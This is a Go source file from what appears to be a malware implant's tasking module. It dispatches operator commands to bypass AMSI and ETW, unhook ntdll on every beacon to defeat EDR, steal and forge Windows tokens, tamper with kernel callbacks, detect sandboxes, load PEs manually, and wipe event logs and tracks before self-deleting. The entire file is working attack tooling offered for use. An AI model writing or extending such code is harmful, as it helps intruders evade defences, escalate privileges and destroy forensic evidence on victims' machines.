//go:build linux || windows || darwin
// +build linux windows darwin

package main

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"os"
	"runtime"
	"strconv"
	"strings"
	"time"
)

func handleAMSIByPass(task Task, res *TaskResult) {
	if runtime.GOOS != "windows" {
		res.Error = "amsi_bypass is Windows-only"
	} else {
		res.Output = amsiBypass()
	}
}

func handleETWByPass(task Task, res *TaskResult) {
	if runtime.GOOS != "windows" {
		res.Error = "etw_bypass is Windows-only"
	} else {
		res.Output = etwBypass()
	}
}

func handleETWNtraceBypass(task Task, res *TaskResult) {
	if runtime.GOOS != "windows" {
		res.Error = "etw_ntrace_bypass is Windows-only"
	} else {
		res.Output = etwNtTraceEvent()
	}
}

func handleAMSISessionBypass(task Task, res *TaskResult) {
	if runtime.GOOS != "windows" {
		res.Error = "amsi_session_bypass is Windows-only"
	} else {
		res.Output = amsiSessionBypass()
	}
}

func handleBlockDLLs(task Task, res *TaskResult) {
	if runtime.GOOS != "windows" {
		res.Error = "blockdlls is Windows-only"
	} else {
		res.Output = blockDLLs()
	}
}

// ntdllUnhooked records whether an operator has enabled ntdll unhooking. Once
// set, the implant re-applies the unhook on every beacon cycle so EDRs that
// re-instrument ntdll between beacons are defeated continuously.
var ntdllUnhooked bool

func handleUnhookNtdll(task Task, res *TaskResult) {
	if runtime.GOOS != "windows" {
		res.Error = "unhook_ntdll is Windows-only"
	} else {
		res.Output = unhookNtdll()
		ntdllUnhooked = true
	}
}

// reapplyNtdllUnhook re-restores the clean ntdll .text from disk each beacon
// cycle once unhooking has been enabled. It is a no-op until an operator issues
// the unhook task, and on non-Windows platforms (no in-memory module to unhook).
func reapplyNtdllUnhook() {
	if !ntdllUnhooked || runtime.GOOS != "windows" {
		return
	}
	if out := unhookNtdll(); Debug {
		fmt.Printf("[evasion] re-unhook: %s\n", out)
	}
}

func handleProtectProcess(task Task, res *TaskResult) {
	if runtime.GOOS != "windows" {
		res.Error = "protect_process is Windows-only"
	} else {
		res.Output = protectProcess()
	}
}

// ?? Cleanup / Anti-Forensics ????????????????????????????????????????????

func handleCleanup(task Task, res *TaskResult) {
	var out string
	out += wipeEventLog() + "\n"
	out += wipeTracks() + "\n"
	out += selfDelete() + "\n"
	res.Output = out
	sendTaskResult(*res)
	time.Sleep(500 * time.Millisecond)
	os.Exit(0)
}

func handleLogWipe(task Task, res *TaskResult) {
	if runtime.GOOS != "windows" {
		res.Error = "log_wipe is Windows-only"
	} else {
		res.Output = wipeEventLog()
	}
}

func handleTrackWipe(task Task, res *TaskResult) {
	if runtime.GOOS != "windows" {
		res.Error = "track_wipe is Windows-only"
	} else {
		res.Output = wipeTracks()
	}
}

func handleSelfDelete(task Task, res *TaskResult) {
	res.Output = selfDelete()
}

// ?? Token ???????????????????????????????????????????????????????????????

func handleTokenListProcs(task Task, res *TaskResult) {
	if runtime.GOOS != "windows" {
		res.Error = "token ops only on Windows"
		return
	}
	procs, err := tokenListProcesses()
	if err != nil {
		res.Error = err.Error()
	} else {
		data, _ := json.Marshal(procs)
		res.Output = base64.StdEncoding.EncodeToString(data)
		res.Encoding = "base64"
	}
}

func handleTokenSteal(task Task, res *TaskResult) {
	if runtime.GOOS != "windows" {
		res.Error = "token ops only on Windows"
		return
	}
	pid, err := strconv.ParseUint(strings.TrimSpace(task.Command), 10, 32)
	if err != nil {
		res.Error = fmt.Sprintf("invalid pid: %v", err)
		return
	}
	dom, user, integ, err := tokenSteal(uint32(pid))
	if err != nil {
		res.Error = err.Error()
	} else {
		m := map[string]string{
			"domain":    dom,
			"username":  user,
			"integrity": integ,
			"pid":       task.Command,
			"whoami":    getCurrentTokenUser(),
		}
		data, _ := json.Marshal(m)
		res.Output = string(data)
	}
}

func handleTokenMake(task Task, res *TaskResult) {
	if runtime.GOOS != "windows" {
		res.Error = "token ops only on Windows"
		return
	}
	domUser := task.Command
	password := task.Shell
	logonType := task.Path
	dom, user, integ, err := tokenMake(domUser, password, logonType)
	if err != nil {
		res.Error = err.Error()
	} else {
		m := map[string]string{
			"domain":     dom,
			"username":   user,
			"integrity":  integ,
			"logon_type": logonType,
			"whoami":     getCurrentTokenUser(),
		}
		data, _ := json.Marshal(m)
		res.Output = string(data)
	}
}

func handleTokenRevert(task Task, res *TaskResult) {
	if runtime.GOOS != "windows" {
		res.Error = "token ops only on Windows"
		return
	}
	if err := tokenRevert(); err != nil {
		res.Error = err.Error()
	} else {
		whoami := getCurrentTokenUser()
		res.Output = fmt.Sprintf(`{"status":"reverted","whoami":%q}`, whoami)
	}
}

func handleTokenWhoami(task Task, res *TaskResult) {
	if runtime.GOOS != "windows" {
		res.Error = "token ops only on Windows"
		return
	}
	whoami := getCurrentTokenUser()
	res.Output = fmt.Sprintf(`{"whoami":%q}`, whoami)
}

// ── Kernel-Level Evasion Task Handlers ──

func handleEvasionKernelCallback(task Task, res *TaskResult) {
	if runtime.GOOS != "windows" {
		res.Error = "kernel_callback is Windows-only"
		return
	}
	res.Output = runEvasion("kernel_callback")
}

func handleEvasionETWTI(task Task, res *TaskResult) {
	if runtime.GOOS != "windows" {
		res.Error = "etwti is Windows-only"
		return
	}
	res.Output = runEvasion("etwti")
}

func handleEvasionEnumCallbacks(task Task, res *TaskResult) {
	if runtime.GOOS != "windows" {
		res.Error = "enum_callbacks is Windows-only"
		return
	}
	res.Output = runEvasion("enum_callbacks")
}

func handleEvasionObjCB(task Task, res *TaskResult) {
	if runtime.GOOS != "windows" {
		res.Error = "objcb is Windows-only"
		return
	}
	res.Output = runEvasion("objcb")
}

func handleSandboxDetect(task Task, res *TaskResult) {
	detector := NewSandboxDetector()
	detailed := detector.DetailedDetect()
	totalConfidence := 0
	var sb strings.Builder
	sb.WriteString("Sandbox Detection Results:\n")
	sb.WriteString(strings.Repeat("=", 60) + "\n")
	for _, r := range detailed {
		status := "CLEAN"
		if r.Detected {
			status = "DETECTED"
			totalConfidence += r.Confidence
		}
		sb.WriteString(fmt.Sprintf("[%s] %s (%d%%)\n", status, r.Name, r.Confidence))
	}
	sb.WriteString(strings.Repeat("=", 60) + "\n")
	sb.WriteString(fmt.Sprintf("Total Confidence: %d%%\n", totalConfidence))
	sb.WriteString(fmt.Sprintf("Verdict: %s\n", map[bool]string{true: "SANDBOX", false: "CLEAN"}[totalConfidence >= 50]))

	// Encode as JSON for structured parsing
	type checkResult struct {
		Name       string `json:"name"`
		Detected   bool   `json:"detected"`
		Confidence int    `json:"confidence"`
		Desc       string `json:"description"`
	}
	var checks []checkResult
	for _, r := range detailed {
		checks = append(checks, checkResult{
			Name:       r.Name,
			Detected:   r.Detected,
			Confidence: r.Confidence,
			Desc:       r.Description,
		})
	}
	jsonOut, _ := json.Marshal(map[string]interface{}{
		"text":       sb.String(),
		"is_sandbox": totalConfidence >= 50,
		"confidence": totalConfidence,
		"checks":     checks,
	})
	res.Output = string(jsonOut)
	res.Encoding = "json"
}

func handleEvasionImgLoad(task Task, res *TaskResult) {
	if runtime.GOOS != "windows" {
		res.Error = "imgload is Windows-only"
		return
	}
	args := task.Command
	if args == "" {
		res.Output = runEvasion("imgload")
		return
	}
	out, err := loadManualPE(args)
	if err != nil {
		res.Error = err.Error()
		return
	}
	res.Output = out
}

func handleSandboxDetectAdvanced(task Task, res *TaskResult) {
	res.Output = RunAdvancedSandboxCheck()
	res.Encoding = "json"
}

func handleAMSIHardwareBP(task Task, res *TaskResult) {
	if runtime.GOOS != "windows" {
		res.Error = "amsi_hardware_bp is Windows-only"
		return
	}
	res.Output = HardwareBreakpointAMSI()
}

func handleETWHardwareBP(task Task, res *TaskResult) {
	if runtime.GOOS != "windows" {
		res.Error = "etw_hardware_bp is Windows-only"
		return
	}
	res.Output = HardwareBreakpointETW()
}

func handleSetSleepMaskAdvanced(task Task, res *TaskResult) {
	if !setActiveSleepMask("advanced") {
		res.Error = "failed to set advanced sleep mask (not available on this platform)"
		return
	}
	res.Output = "sleep mask switched to: advanced (AES-CBC page encryption + stack splice)"
}

func init() {
	wrap := func(fn func(Task, *TaskResult)) evasionFunc {
		return func() string {
			var res TaskResult
			fn(Task{}, &res)
			if res.Error != "" {
				return "error: " + res.Error
			}
			return res.Output
		}
	}
	registerEvasion("amsi", wrap(handleAMSIByPass))
	registerEvasion("etw", wrap(handleETWByPass))
	registerEvasion("etw_ntrace", wrap(handleETWNtraceBypass))
	registerEvasion("amsi_session", wrap(handleAMSISessionBypass))
	registerEvasion("blockdlls", wrap(handleBlockDLLs))
	registerEvasion("unhook_ntdll", wrap(handleUnhookNtdll))
	registerEvasion("protect_process", wrap(handleProtectProcess))
	registerEvasion("amsi_hardware_bp", wrap(handleAMSIHardwareBP))
	registerEvasion("etw_hardware_bp", wrap(handleETWHardwareBP))
	// The kernel-level techniques are registered only on non-Windows builds.
	// The real implementations live in evasion_*_windows.go and register
	// themselves; re-registering them here would overwrite those real entries
	// with wrap(handleEvasion*) — and since handleEvasion* dispatch through
	// runEvasion(name), that produces infinite recursion (stack overflow) on a
	// Windows victim. On non-Windows the wrapper is kept so run_evasion reports
	// the same "Windows-only" error as the direct task types.
	if runtime.GOOS != "windows" {
		registerEvasion("kernel_callback", wrap(handleEvasionKernelCallback))
		registerEvasion("etwti", wrap(handleEvasionETWTI))
		registerEvasion("enum_callbacks", wrap(handleEvasionEnumCallbacks))
		registerEvasion("objcb", wrap(handleEvasionObjCB))
		registerEvasion("imgload", wrap(handleEvasionImgLoad))
	}
}

// Unified evasion handler - runs any registered technique by name
func handleRunEvasion(task Task, res *TaskResult) {
	technique := strings.TrimSpace(task.Command)
	if technique == "" {
		res.Error = "technique parameter required (e.g. amsi, etw, blockdlls, veh, syscall)"
		return
	}
	if len(technique) > 64 {
		technique = technique[:64]
	}

	output := runEvasion(technique)
	if output == "" {
		res.Error = fmt.Sprintf("unknown evasion technique: %s", technique)
		return
	}
	if strings.HasPrefix(output, "error: ") {
		res.Error = output[7:]
		return
	}
	res.Output = output
}
